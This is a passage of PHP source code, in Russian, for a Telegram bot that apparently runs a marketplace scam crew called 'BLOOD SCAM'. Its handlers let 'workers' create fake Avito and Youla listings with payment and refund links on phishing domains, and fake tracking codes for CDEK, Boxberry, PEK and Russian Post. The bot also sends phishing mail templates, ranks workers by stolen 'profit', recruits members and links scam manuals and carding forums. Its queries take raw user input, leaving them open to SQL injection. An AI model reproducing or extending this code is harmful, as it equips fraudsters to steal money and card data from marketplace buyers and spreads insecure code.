							if($edit[1] >= $settings['min_price'] AND $edit[1] <= $settings['max_price']) {
								$adverts = mysqli_query($connection, "SELECT * FROM `adverts` WHERE `advert_id` = '$edit[0]'");
								$trackcodes = mysqli_query($connection, "SELECT `code`, `amount`, `worker`, `product`, `status` FROM `trackcodes` WHERE `code` = '$edit[0]'");

								if(mysqli_num_rows($adverts) > 0 OR mysqli_num_rows($trackcodes) > 0) {
									if(mysqli_num_rows($adverts) > 0) {
										$advert = mysqli_fetch_assoc($adverts);

										if($advert['worker'] == $message['from']) {
											mysqli_query($connection, "UPDATE `adverts` SET `price` = '$edit[1]' WHERE `advert_id` = '$edit[0]'");

											$text = "✍🏿 <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>изменил сумму объявления с</b> <code>$advert[price] руб.</code> <b>на</b> <code>$edit[1] руб.</code>\n";
											send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
											$text = "💶 <b>Вы изменили цену на объявлении с</b> <code>$advert[price] руб.</code> <b>до</b> <code>$edit[1] руб.</code>\n\n";

											if($advert['type'] == 0) {
												$text .= "<b>Оплата:</b> https://$domains[avito]/buy?id=$edit[0]\n";
												$text .= "<b>Возврат:</b> https://$domains[avito]/refund?id=$edit[0]";
											} elseif($advert['type'] == 1) {
												$text .= "<b>Оплата:</b> https://$domains[youla]/product/$edit[0]/buy/delivery\n";
												$text .= "<b>Возврат:</b> https://$domains[youla]/refund/$edit[0]/\n";
											}
										} else {
											$text = "📬 <b>Объявление закреплено не за вашим аккаунтом</b>";
										}
									} elseif(mysqli_num_rows($trackcodes) > 0) {
										$track = mysqli_fetch_assoc($trackcodes);

										if($track['worker'] == $message['from']) {
											if($track['status'] > 0) {
												mysqli_query($connection, "UPDATE `trackcodes` SET `amount` = '$edit[1]' WHERE `code` = '$edit[0]' AND `worker` = '$message[from]' AND `status` > '0'");

												$text = "✍🏿 <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>изменил сумму трек-кода с</b> <code>$track[amount] руб.</code> <b>на</b> <code>$edit[1] руб.</code>\n";
												send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
												$text = "💶 <b>Вы изменили цену на трек-коде с</b> <code>$track[amount] руб.</code> <b>до</b> <code>$edit[1] руб.</code>";
											} else {
												$text = "📬 <b>Трек-код ещё не обработан или уже неактивен</b>";
											}
										} else {
											$text = "📬 <b>Трек-код закреплен не за вашим аккаунтом</b>";
										}
									} else {
										$text = "📬 <b>Объявление или трек-код с таким ID не было найдено</b>";
									}
								} else {
									$text = "📬 <b>Объявление или трек-код с таким ID не было найдено</b>";
								}
							} else {
								$text = "🚫 <b>Сумма товара не может быть больше $settings[max_price] руб. и меньше $settings[min_price] руб.</b>";
							}

							send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						} else {
							$text = "❔ Используйте /setprice <code>[ID объявления];[Сумма товара]</code>";
							send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}


//=============== Добавить изменить название товара =====================//


					if(preg_match('/^\/settitle/i', $message['text']) == TRUE) {
						if(preg_match('/^\/settitle (.{24}|\d+);.+$/i', $message['text']) == TRUE) {
							$edit = explode(';', mb_substr($message['text'], 10));

							$adverts = mysqli_query($connection, "SELECT * FROM `adverts` WHERE `advert_id` = '$edit[0]'");
							$trackcodes = mysqli_query($connection, "SELECT `code`, `amount`, `worker`, `product`, `status` FROM `trackcodes` WHERE `code` = '$edit[0]'");

							if(mysqli_num_rows($adverts) > 0 OR mysqli_num_rows($trackcodes) > 0) {
								if(mysqli_num_rows($adverts) > 0) {
									$advert = mysqli_fetch_assoc($adverts);

									if($advert['worker'] == $message['from']) {
										mysqli_query($connection, "UPDATE `adverts` SET `title` = '$edit[1]' WHERE `advert_id` = '$edit[0]'");

										$text = "➕ <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>изменил название объявления</b>\n";
										send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
										$text = "💶 <b>Вы изменили название объявлении</b>\n\n";

										if($advert['type'] == 0) {
											$text .= "<b>Оплата:</b> https://$domains[avito]/buy?id=$edit[0]\n";
											$text .= "<b>Возврат:</b> https://$domains[avito]/refund?id=$edit[0]";
										} elseif($advert['type'] == 1) {
											$text .= "<b>Оплата:</b> https://$domains[youla]/product/$edit[0]/buy/delivery\n";
											$text .= "<b>Возврат:</b> https://$domains[youla]/refund/$edit[0]/\n";
										}
									} else {
										$text = "📬 <b>Объявление закреплено не за вашим аккаунтом</b>";
									}
								} elseif(mysqli_num_rows($trackcodes) > 0) {
									$track = mysqli_fetch_assoc($trackcodes);

									if($track['worker'] == $message['from']) {
										if($track['status'] > 0) {
											mysqli_query($connection, "UPDATE `trackcodes` SET `product` = '$edit[1]' WHERE `code` = '$edit[0]' AND `worker` = '$message[from]' AND `status` > '0'");

											$text = "✍🏿 <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>изменил название своего трек-кода на</b> <b>на</b> <code>$edit[1]</code>\n";
											send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
											$text = "💶 <b>Вы изменили название своего трек-кода на</b> <code>$edit[1]</code>";
										} else {
											$text = "📬 <b>Трек-код ещё не обработан или уже неактивен</b>";
										}
									} else {
										$text = "📬 <b>Трек-код закреплен не за вашим аккаунтом</b>";
									}
								}
							} else {
								$text = "📬 <b>Объявление или трек-код с таким ID не было найдено</b>";
							}

							send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						} else {
							$text = "❔ Используйте /settitle <code>[ID объявления];[Название товара]</code>";
							send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}



//==================== Начать работу бота =========================//



					if(preg_match('/\/start/i', $message['text']) == TRUE OR $message['text'] == '⬅️ Назад') {

						mysqli_query($connection, "UPDATE `trackcodes` SET `status` = '-1' WHERE `worker` = '$message[from]' AND `status` = '0'");
						mysqli_query($connection, "UPDATE `adverts` SET `status` = '-1' WHERE `worker` = '$message[from]' AND `status` = '0'");
						mysqli_query($connection, "UPDATE `mails` SET `status` = '-1' WHERE `worker` = '$message[from]' AND `status` = '0'");

						$keyboard = json_encode(Array('keyboard' => Array(Array('👤 Профиль', '🔰️ Сайты', '🔗 Мои ссылки'), Array('⚙️ Инструменты', '❓ Помощь'), Array('📅 Статистика')), 'resize_keyboard' => TRUE, 'one_time_keyboard' => FALSE));
						send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => getMyProfile($message['from']), 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
					}


//==================== Профиль =========================//


					if($message['text'] == '👤 Профиль') {
						send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => getMyProfile($message['from']), 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => getMyProfile($message['from'], 0, 1)));
					}



//==================== Инструменты ======================//

                if($message['text'] == '⚙️ Инструменты') {


                    $text = '⚙️ Выберете инструмент';

                    $keyboard = json_encode(Array('keyboard' => Array(Array('👾 Аккаунты', '✉️ Почта'), Array('⬅️ Назад')), 'resize_keyboard' => TRUE, 'one_time_keyboard' => FALSE));

                    send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
                }


//==================== Созданные объявления ( ссылки ) =========================//


					if($message['text'] == '🔗 Мои ссылки') {
						send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => getMyAdverts($message['from'], 0), 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => getMyAdverts($message['from'], 0, 1)));
					}



//==================== Создать ссылку =========================//


                    if($message['text'] == '🔰️ Сайты'){

                        $text = '🔰️<b>Сайты</b>';

                        $keyboard = json_encode(Array('keyboard' => Array(Array('🛒 Маркеты', '📮 Доставка'), Array('⬅️ Назад')), 'resize_keyboard' => TRUE, 'one_time_keyboard' => FALSE));

						send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));

                    }


                    if($message['text'] == '🛒 Маркеты') {

                        $text = '🛒 ️<b>Маркеты</b>';

                        $keyboard = json_encode(Array('keyboard' => Array(Array('📦 Авито', '🛍 Юла'), Array('⬅️ Назад')), 'resize_keyboard' => TRUE, 'one_time_keyboard' => FALSE));

						send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));

                    }



                    if($message['text'] == '📦 Авито' OR $message['text'] == '🛍 Юла') {

                        $search = mysqli_query($connection, "SELECT `id` FROM `adverts` WHERE `worker` = '$message[from]' AND `status` = '0'");

						if(mysqli_num_rows($search) > 0) {
							$text = "👺 <b>У вас уже есть несозданное объявление</b>";
						} else {
							if($message['text'] == '📦 Авито') $type = '0';
							if($message['text'] == '🛍 Юла') $type = '1';

							$keyboard = json_encode(Array('keyboard' => Array(Array('⬅️ Назад')), 'resize_keyboard' => TRUE, 'one_time_keyboard' => FALSE));

							mysqli_query($connection, "INSERT INTO `adverts` (`type`, `advert_id`, `worker`, `price`, `delivery`, `views`, `status`, `time`) VALUES ('$type', '".rand(10000000000, 99999999999)."', '$message[from]', '0', '0', '0', '0', '".time()."')");

							$text = "🎒 <b>Введите название вашего товара</b>";
							send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
						}

                    }



                    if($message['text'] == '📮 Доставка') {

                        $text = '🛒 ️<b>Маркеты</b>';

                        $keyboard = json_encode(Array('keyboard' => Array(Array('📬 Почта РФ', '🚛 СДЭК'), Array('✈️ ПЭК', '🚚 Боксберри'), Array('⬅️ Назад')), 'resize_keyboard' => TRUE, 'one_time_keyboard' => FALSE));

						send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));

                    }

                    if($message['text'] == '📅 Статистика') {

                        $text = "📈 <b>Лучшие воркеры за все время:</b> \n\n";
                        $user1 = array();
                        $user1 = mysqli_query($connection, "SELECT `telegram` FROM `accounts` WHERE `id` > 1");
                        $i=0;
                        $allsumm = 0;
                        foreach ($user1 as $key) {
                            $x = 0;
                            $wkrks[$i] = array();
                            $key['telegram'];
                            $trans = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count`, SUM(`amount`) AS `total` FROM `payments` WHERE `worker` = '$key[telegram]' AND `status` = '1'"));
                            $wkrks[$i]['count'] = $trans['count'];
                            $wkrks[$i]['total'] = $trans['total'];
                            $wkrks[$i]['tg'] = $key['telegram'];
                            $allsumm += $trans['total'];
                            $i++;
                        }
                        for ($j = 0; $j<$i; $j++)
                        {
                            for ($z = 0; $z < $i; $z++)
                            {
                                if ($wkrks[$z]['total'] < $wkrks[$z+1]['total'])
                                {
                                    $tmp = $wkrks[$z];
                                    $wkrks[$z] = $wkrks[$z+1];
                                    $wkrks[$z+1] = $tmp;
                                }
                            }
                        }

                        $i--;
                        $x = 0;
                        $permitted_chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    					while($x < $i && $x<10) {
    					    $s = substr(str_shuffle($permitted_chars), 0, 10);
    						$b = $x+1;
    						$text .= "<b>⚡️ $b. Воркер: </b><a>#$s </a> \n";
    						$t = $wkrks[$x]['total'];
    						if (!isset($t))
    						    $t = 0;
    						$c = $wkrks[$x]['count'];
    						$text .= "💰 <b>Профит: </b> <code>$t RUB</code><b> | </b>💎<b> Оплат: </b> <code>$c</code> \n\n";
    						$x++;
    					}

						send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));

                    }

                    //==================== Помощь =====================//

                    if($message['text'] == '❓ Помощь') {

                        $allsumm = mysqli_fetch_assoc(mysqli_query($connection, "SELECT SUM(`amount`) AS `total` FROM `payments` WHERE `status` = '1'"));
                        $c = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count` FROM `accounts`"));
                        $text = "❓ <b>Помощь</b>\n\n";
                        $text .= "В данном разделе, вы можете ознакомиться с информацией о нашем проекте, а также прочитать мануалы по работе\n\n";
                        $text .= "⏰ Открылись: 17 апреля\n";
                        $text .= "💳 Профитов на сумму:  $allsumm[total] ₽\n";
                        $text .= "👤 Всего воркеров:  $c[count] \n\n";
                        $text .= "❤️ Технические вопросы:\n";
                        $text .= "💰 Финансовые вопросы: @bankir_bs\n\n";
                        $text .= "💸 Канал с залетами: <a href='https://t.me/joinchat/AAAAAEdh0xyKuDYGEQf7PA'>Перейти</a>\n\n";
                        $text .= "⚠️ Информационный канал: <a href='w'>Перейти</a>\n\n";
                        $text .= "🚛 Avito/Youla\n";
                        $text .= "<a href='https://telegra.ph/Podrobnyj-manual-ot-BLOOD-SCAM-AvitoYoula-04-05'>—Подробный мануал от </a>\n\n";
                        $text .= "🚚 Транспортные компании\n";
                        $text .= "<a href='https://telegra.ph/Podrobnyj-manual-ot-BLOOD-SCAM-TK-04-05'>—Подробный мануал от </a>\n\n";
                        $text .= "🔰 Безопасность\n";
                        $text .= "<a href='https://telegra.ph/Bezopasnost-na-PK-manual-ot-BLOOD-SCAM-04-05'>Мануал по безопасности на ПК</a>\n";
                        $text .= "<a href='https://telegra.ph/Bezopasnost-na-Telefone-manual-ot-BLOOD-SCAM-04-05'>Мануал по безопасности на Телефоне</a>\n\n";
                        $text .= "💎 Мануал по BTC\n";
                        $text .= "<a href='https://telegra.ph/Manual-po-blockchaincom-ot-BLOOD-SCAM-04-05'>Мануал по blockchain.com</a>\n";
                        $text .= "<a href='https://telegra.ph/Manual-po-blockchaincom-ot-BLOOD-SCAM-04-05'>Мануал по BTC Banker</a>\n\n";
                        $text .= "👍🏻 Наши темы на форумах: \n\n";
                        $text .= "😎 BHF  |  ♻️ LOLZTEAM  |  💎 GERKI";

                        send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                    }






//==================== Почта письмо =========================//

					if($message['text'] == '✉️ Почта') {
						$search = mysqli_query($connection, "SELECT `id` FROM `mails` WHERE `worker` = '$message[from]' AND `status` = '0'");
						if(mysqli_num_rows($search) == 0) {

						  $text = '✔️ <b>Выберете шаблон</b>';

						  $keyboard = json_encode(Array('inline_keyboard' => Array(Array(Array('text' => '📦 Авито', 'callback_data' => '/mail/avito'), Array('text' => '🛍 Юла', 'callback_data' => '/mail/youla')), Array(Array('text' => '🚛 СДЭК', 'callback_data' => '/mail/cdek'), Array('text' => '🚚 Боксберри', 'callback_data' => '/mail/boxberry')))));

						  send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));

						}
					}


//==================== Аккаунты =========================//


					if($message['text'] == '👾 Аккаунты') {
						$text = "👾 <b>Бесплатные аккаунты</b>\n\nРаз в день вы можете получить бесплатный аккаунт для Авито";
						$keyboard = json_encode(Array('inline_keyboard' => Array(Array(Array('text' => '📦 Авито', 'callback_data' => '/account/avito/')))));
						send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));

					}


//================== Почтовые сервисы ======================//


					if($message['text'] == '🗳 Почтовые сервисы') {
						$text = "🗳 <b>Почтовые сервисы</b>\n\n";
						$text .= "❔ <code>Выберите сервис.</code>";

						$keyboard = json_encode(Array('keyboard' => Array(Array('⬅️ Назад')), 'resize_keyboard' => TRUE, 'one_time_keyboard' => FALSE));

						send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
					}



					if($message['text'] == '🚚 Боксберри') {
						$search = mysqli_query($connection, "SELECT `id` FROM `trackcodes` WHERE `worker` = '$message[from]' AND `status` = '0'");
						if(mysqli_num_rows($search) > 0) {
							$text = "⚠️ <b>У вас уже есть несозданный трек-код</b>";
						} else {

						    $keyboard = json_encode(Array('keyboard' => Array(Array('⬅️ Назад')), 'resize_keyboard' => TRUE, 'one_time_keyboard' => FALSE));
							mysqli_query($connection, "INSERT INTO `trackcodes` (`type`, `code`, `worker`, `status`, `time`) VALUES ('0', '".rand(1000000, 99999999999)."', '$message[from]', '0', '".time()."')");
							$text = "🤓 <b>Введите ФИО отправителя товара</b>";
							send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
						}
					}

					if($message['text'] == '🚛 СДЭК') {
						$search = mysqli_query($connection, "SELECT `id` FROM `trackcodes` WHERE `worker` = '$message[from]' AND `status` = '0'");
						if(mysqli_num_rows($search) > 0) {
							$text = "⚠️ <b>У вас уже есть несозданный трек-код</b>";
						} else {
						    $keyboard = json_encode(Array('keyboard' => Array(Array('⬅️ Назад')), 'resize_keyboard' => TRUE, 'one_time_keyboard' => FALSE));
							mysqli_query($connection, "INSERT INTO `trackcodes` (`type`, `code`, `worker`, `status`, `time`) VALUES ('1', '".rand(1000000, 99999999999)."', '$message[from]', '0', '".time()."')");
							$text = "🤓 <b>Введите ФИО отправителя товара</b>";
							send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
						}
					}

					if($message['text'] == '✈️ ПЭК') {
						$search = mysqli_query($connection, "SELECT `id` FROM `trackcodes` WHERE `worker` = '$message[from]' AND `status` = '0'");
						if(mysqli_num_rows($search) > 0) {
							$text = "⚠️ <b>У вас уже есть несозданный трек-код</b>";
						} else {
							mysqli_query($connection, "INSERT INTO `trackcodes` (`type`, `code`, `worker`, `status`, `time`) VALUES ('2', '".rand(1000000, 99999999999)."', '$message[from]', '0', '".time()."')");
							$text = "🤓 <b>Введите ФИО отправителя товара</b>";
							send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}

					if($message['text'] == '📬 Почта РФ') {
						$search = mysqli_query($connection, "SELECT `id` FROM `trackcodes` WHERE `worker` = '$message[from]' AND `status` = '0'");
						if(mysqli_num_rows($search) > 0) {
							$text = "⚠️ <b>У вас уже есть несозданный трек-код</b>";
						} else {
							mysqli_query($connection, "INSERT INTO `trackcodes` (`type`, `code`, `worker`, `status`, `time`) VALUES ('3', '".rand(1000000, 99999999999)."', '$message[from]', '0', '".time()."')");
							$text = "🤓 <b>Введите ФИО отправителя товара</b>";
							send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}

				} else {
					$users = mysqli_fetch_assoc(mysqli_query($connection, "SELECT `id`, `access` FROM `accounts` WHERE `telegram` = '$message[from]'"));

					$requests = mysqli_query($connection, "SELECT `id`, `value1`, `value2`, `value3`, `value4`, `rules` FROM `requests` WHERE `telegram` = '$message[from]' AND `status` != '-1' AND `status` < '3' ORDER BY `id` DESC");

					if(mysqli_num_rows($requests) > 0) {
						$request = mysqli_fetch_assoc($requests);

						if($request['status'] == 1) {
							$text = "📨 <b>Ваша заявка готова к отправке, провьте её:</b>\n\n";
							$text .= "<b>Где нашли:</b> <i>$request[value1]</i>\n";
							$text .= "<b>Опыт работы:</b> <i>$request[value2]</i>\n";
							$text .= "<b>Время работы:</b> <i>$request[value3]</i>\n";
							if($request['value4'] == 0) {
								$text .= "<b>Кто вас пригласил:</b> <i>Никто</i>\n";
							} else {
								$text .= "<b>Кто вас пригласил:</b> <a href=\"tg://user?id=$request[value4]\">$request[value4]</a>\n";
							}
							$keyboard = json_encode(Array('inline_keyboard' => Array(Array(Array('text' => '✔️ Отправить', 'callback_data' => '/join/send/'), Array('text' => '🗑 Отменить', 'callback_data' => '/join/cancel/')))));
							send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
						} elseif($request['status'] == 2) {
							$text = "⏱ <b>Ваша заявка находится на проверке у модераторов</b>\n\n";
							send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						} elseif(isset($message['text']) AND $request['rules'] == '0') {
							$text = "Для продолжения необходимо ознакомиться с правилами нашего проекта и согласиться с ними";
							send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						} elseif(empty($request['value1']) AND empty($request['value2']) AND empty($request['value3']) AND $request['rules'] == '1') {
							mysqli_query($connection, "UPDATE `requests` SET `value1` = '$message[text]' WHERE `telegram` = '$message[from]' AND `status` = '0'");
							$text = "Есть ли опыт в подобной сфере, если да, то какой?";
							send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						} elseif(isset($request['value1']) AND empty($request['value2']) AND empty($request['value3']) AND $request['rules'] == '1') {
							mysqli_query($connection, "UPDATE `requests` SET `value2` = '$message[text]' WHERE `telegram` = '$message[from]' AND `status` = '0'");
							$text = "Сколько времени вы готовы уделять работе и какого результата вы хотите добиться?";
							send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						} elseif(isset($request['value1']) AND isset($request['value2']) AND empty($request['value3']) AND $request['rules'] == '1') {
							mysqli_query($connection, "UPDATE `requests` SET `value3` = '$message[text]' WHERE `telegram` = '$message[from]' AND `status` = '0'");
							if(empty($request['value4'])) {
								$text = "Кто вас пригласил?\n\nВведите имя пользователя или Telegram ID\nВведите <code>0</code>, чтобы пропустить этот пункт";
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
							} else {
								$user['telegram'] = $request['value4'];

								$text = "📨 <b>Ваша заявка готова к отправке, провьте её:</b>\n\n";
								$text .= "<b>Где нашли:</b> <i>$request[value1]</i>\n";
								$text .= "<b>Опыт работы:</b> <i>$request[value2]</i>\n";
								$text .= "<b>Время работы:</b> <i>$message[text]</i>\n";
								if($user['telegram'] == 0) {
									$text .= "<b>Кто вас пригласил:</b> <i>Никто</i>\n";
								} else {
									$text .= "<b>Кто вас пригласил:</b> <a href=\"tg://user?id=$user[telegram]\">$user[telegram]</a>\n";
								}
								$keyboard = json_encode(Array('inline_keyboard' => Array(Array(Array('text' => '✔️ Отправить', 'callback_data' => '/join/send/'), Array('text' => '🗑 Отменить', 'callback_data' => '/join/cancel/')))));
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
								$text = "➕ <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>закончил заполнение заявки в команду</b>\n";
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						} elseif(isset($request['value1']) AND isset($request['value2']) AND isset($request['value3']) AND $request['rules'] == '1') {
							if(preg_match('/\d+/i', $message['text']) == TRUE) {
								$search = $message['text'];
								$query = mysqli_query($connection, "SELECT `telegram` FROM `accounts` WHERE `telegram` = '$search'");
							} elseif(preg_match('/@{0,1}[\w.]+/i', $message['text']) == TRUE) {
								$search = str_replace('@', '', $message['text']);
								$query = mysqli_query($connection, "SELECT `telegram` FROM `accounts` WHERE `username` LIKE '%$search%'");
							}

							if(mysqli_num_rows($query) > 0 OR $message['text'] == 0) {
								if(empty($request['value4'])) {
									if(mysqli_num_rows($query) > 0) { $user = mysqli_fetch_assoc($query); } else { $user['telegram'] = 0; }
									mysqli_query($connection, "UPDATE `requests` SET `value4` = '$user[telegram]', `status` = '1' WHERE `telegram` = '$message[from]' AND `status` = '0'");
								} else {
									$user['telegram'] = $request['value4'];
								}

								$text = "📨 <b>Ваша заявка готова к отправке, провьте её:</b>\n\n";
								$text .= "<b>Где нашли:</b> <i>$request[value1]</i>\n";
								$text .= "<b>Опыт работы:</b> <i>$request[value2]</i>\n";
								$text .= "<b>Время работы:</b> <i>$request[value3]</i>\n";
								if($user['telegram'] == 0) {
									$text .= "<b>Кто вас пригласил:</b> <i>Никто</i>\n";
								} else {
									$text .= "<b>Кто вас пригласил:</b> <a href=\"tg://user?id=$user[telegram]\">$user[telegram]</a>\n";
								}
								$keyboard = json_encode(Array('inline_keyboard' => Array(Array(Array('text' => '✔️ Отправить', 'callback_data' => '/join/send/'), Array('text' => '🗑 Отменить', 'callback_data' => '/join/cancel/')))));
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
								$text = "➕ <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>закончил заполнение заявки в команду</b>\n";
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							} else {
								$text = "🔎 <b>Воркер с таким ID не был найден</b>\n\nВведите <code>0</code>, чтобы пропустить этот пункт";
								send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						}
					} else {
						if($users['access'] == '-1') {
							$text = "🚫 <b>Ваш аккаунт заблокирован</b>\n\n";
							$text .= "Если это ошибка, то обратитесь к @ssk3leton";
							send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						} elseif(preg_match('/^\/start ref\d+$/i', $message['text']) == TRUE) {
							$referral_id = mb_substr($message['text'], 10);

							mysqli_query($connection, "INSERT INTO `requests` (`username`, `name`, `telegram`, `value4`, `rules`, `status`, `time`) VALUES ('$message[username]', '$message[firstname] $message[lastname]', '$message[from]', '$referral_id', '0', '0', '".time()."')");

							$text = "🔰10 ПРАВИЛ 🔰\n\n";
						$text .= "<b>1.</b> Запрещено медиа с некорректным содержанием (порно, насилие, убийства, призывы к экстремизму, реклама наркотиков).\n";
						$text .= "<b>2.</b> Запрещен спам, флуд, пересылки с других каналов, ссылки на сторонние ресурсы, всякого рода реклама так же запрещена.\n";
						$text .= "<b>3.</b> Запрещено обсуждать других ТСов.\n";
						$text .= "<b>4.</b> Если что-то не устраивает по поводу %, беседы и т.д. пишите Владельцу проекта , а не разводите флуд в чате.\n";
						$text .= "<b>5.</b> Запрещено узнавать у друг друга персональную информацию.\n";
						$text .= "<b>6.</b> Запрещено оскорблять администрацию.\n";
						$text .= "<b>7.</b> Запрещено попрошайничество в беседе воркеров.\n";
						$text .= "<b>8.</b> Администрация не несёт ответственности за блокировку кошельков/карт.\n";
						$text .= "<b>9.</b> Конфликты между собой решать в лс.\n";
						$text .= "<b>10.</b> Месяц без залётов, будем прощаться.\n";
							$text .= "\nВы подтверждаете, что ознакомились и согласны с условиями и правилами нашего проекта?";
							$keyboard = json_encode(Array('inline_keyboard' => Array(Array(Array('text' => '✅ Полностью согласен', 'callback_data' => '/join/accept/')))));

							send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
						} else {
							$text = "🤨 <b>Здравствуйте. Что бы начать работать</b>\n\n";
							$text .= "Просто подайте заявку 👇🏿";
							$keyboard = json_encode(Array('inline_keyboard' => Array(Array(Array('text' => '➕ Подать заявку', 'callback_data' => '/join/')))));
							send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
						}
					}
				}
			}






			// =============== [ ЧАТ МОДЕРАТОРОВ ] =============== //

			if($message['chat_id'] == $config['chat']['moders']) {
				$isAccess = mysqli_query($connection, "SELECT `id` FROM `accounts` WHERE `telegram` = '$message[from]' AND `access` > '100'");

				if(mysqli_num_rows($isAccess) > 0) {
					if(preg_match('/\/adverts (\d+|@{0,1}[\w.]+)/i', $message['text']) == TRUE OR $message['text'] == '/adverts') {
						if($message['text'] == '/adverts') {
